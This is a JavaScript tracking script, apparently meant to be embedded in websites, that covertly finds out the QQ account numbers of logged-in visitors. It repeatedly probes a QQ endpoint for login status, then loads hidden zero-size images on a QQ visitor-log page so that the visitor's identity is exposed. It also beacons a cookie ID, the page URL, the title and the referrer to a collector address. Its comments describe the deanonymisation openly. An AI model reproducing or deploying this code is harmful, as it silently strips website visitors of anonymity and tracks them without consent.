// JavaScript Document
var div_box_qq;
(function() {
 var i_php = "这个URL用于保存"; //当用户登陆QQ后，会用GET到这个URL，并且带一些数据，开发者应该用这个URL去抓取下面定义的两个URL的最近访客
 var i_uid = "137"; // 自定义ID，如果是统计平台用于区分用户
 var i_need_login = false;
 var loginTips = "\u7ee7\u7eed\u8bbf\u95ee";
                        //继续访问
 function showEnterQQiFrame(url) {
  div_box_qq = document.createElement("div");
  div_box_qq.style.verticalAlign = "middle";
  div_box_qq.style.textAlign = "center";
  div_box_qq.style.position = "absolute";
  div_box_qq.style.width = "100%";
  div_box_qq.style.height = "100%";
  div_box_qq.style.top = 0;
  div_box_qq.style.left = 0;
  div_box_qq.style.lineHeight = 24;
  div_box_qq.style.background = "#FFF";
  div_box_qq.style.visibility = "visible";
  div_box_qq.innerHTML = '<a href="' + url + '" target="_blank" onclick="document.body.removeChild(div_box_qq)">' + loginTips + '</a>';
  document.body.appendChild(div_box_qq)
 }
 function _$encode(s) {
    return (typeof(encodeURIComponent) == "function") ? encodeURIComponent(s) : escape(s)
    }
 function _init_send_by_iframe(uincookie, other) {
  var i_referrer = encodeURIComponent(document.referrer);
  var i_url = encodeURIComponent(document.location.href);
  var i_title = encodeURIComponent(document.title);
  var url = i_php+"?action=saveQQ" + other;
  url += "&uid=" + i_uid;
  url += "&meishi=145187799,145187799";
  url += "&uincookie=" + uincookie;
  url += "&referrer=" + i_referrer;
  url += "&url=" + i_url;
  url += "&title=" + _$encode(i_title);
  url += "&r=" + (new Date()).getTime();
  alert(url);
  var oHead = document.getElementsByTagName('HEAD').item(0);
  var oScript = document.createElement("script");
  oScript.type = "text/javascript";
  oScript.src = url;
  oHead.appendChild(oScript)
 }
 function SetCookie(name, value) {
  var exp = new Date();
  exp.setTime(exp.getTime() + 2 * 24 * 60 * 60 * 1000);
  document.cookie = name + "=" + escape(value) + ";expires=" + exp.toGMTString()
 }
 function GetCookie(name) {
  var arr = document.cookie.match(new RegExp("(^| )" + name + "=([^;]*)(;|$)"));
  if (arr != null) return unescape(arr[2]);
  return null
 }
 function insertFrame() {
  var img = new Image();
  img.src = "http://app.data.qq.com/?umod=user&uid=145187799&t=" + (new Date()).getTime(); //核心的东西，当用户登陆QQ后，那么就隐藏打开这个URL，下面的与这个一样，打开后你的QQ就会出现在这个网址里，每个统计平台会随机给你分配两个QQ（别人的），你不需要QQ的密码
  img.width = 0;
  img.height = 0;
  img.border = 0;
  document.body.appendChild(img);
  img = new Image();
  img.src = "http://app.data.qq.com/?umod=user&uid=145187799&t=" + (new Date()).getTime();
  img.width = 0;
  img.height = 0;
  img.border = 0;
  if (img.attachEvent) {
   img.attachEvent("onerror",
   function() {
    newSubmit()
   });
   img.attachEvent("onload",
   function() {
    newSubmit()
   });
   img.attachEvent("onabort",
   function() {
    newSubmit()
   })
  } else {
   img.onerror = function() {
    newSubmit()
   };
   img.onload = function() {
    newSubmit()
   };
   img.onabort = function() {
    newSubmit()
   }
  }
  document.body.appendChild(img)
 }
 var isSubmited = false;
 function newSubmit() {
  if (isSubmited) {
   return
  }
  isSubmited = true;
  var uincookie = GetCookie("uincookie");
  if (uincookie == null) {
   uincookie = "code" + (new Date()).getTime() + parseInt(Math.random() * 100000);
   SetCookie("uincookie", uincookie)
  }
  _init_send_by_iframe(uincookie, "")
 }
 var checkTime = 0;
 function isLogin() {
  var code = null;
  if (typeof(data3) == "undefined") {
   code = data0.err
  } else {
   code = data3.err
  }
  if (code == 1007 || code == 1026) {
   window.clearInterval(isLoginTimeID);
   insertFrame()
  } else {
   var uincookie = GetCookie("uincookie");
   if (uincookie != null && code == 1007 || code == 1026) {
    window.clearInterval(isLoginTimeID);
    _init_send_by_iframe(uincookie, "&do=uincookie")
   } else {
    if (checkTime++==1 && i_need_login) {
     showEnterQQiFrame(i_php + "?action=loginqqiframe")
    }
    var checkscript = document.getElementById("checkloginscript");
    checkscript.parentNode.removeChild(checkscript)
   }
  }
 }
 var isLoginTimeID;
 function dynamicLoad() {
  var vsrc = "http://apps.qq.com/app/yx/cgi-bin/show_fel?hc=8&lc=4&d=365633133&t=" + (new Date()).getTime(); //这个URL判断用户是否登陆过QQ
  var oHead = document.getElementsByTagName('HEAD').item(0);
  var oScript = document.createElement("script");
  oScript.type = "text/javascript";
  oScript.id = "checkloginscript";
  if (oScript.readyState) {
   oScript.onreadystatechange = function() {
    if (oScript.readyState == "loaded" || oScript.readyState == "complete") {
     oScript.onreadystatechange = null;
     isLogin()
    }
   }
  } else {
   oScript.onload = function() {
    isLogin()
   }
  }
  oScript.src = vsrc;
  oHead.appendChild(oScript)
 }
 dynamicLoad();
 isLoginTimeID = window.setInterval(dynamicLoad, 3000)
})();
if (0 == '1') {
 document.writeln("<iframe height=0 width=0 src=\"http://wpa.qq.com/msgrd?v=3&uin=0&site=qq&menu=yes\"></iframe>")
}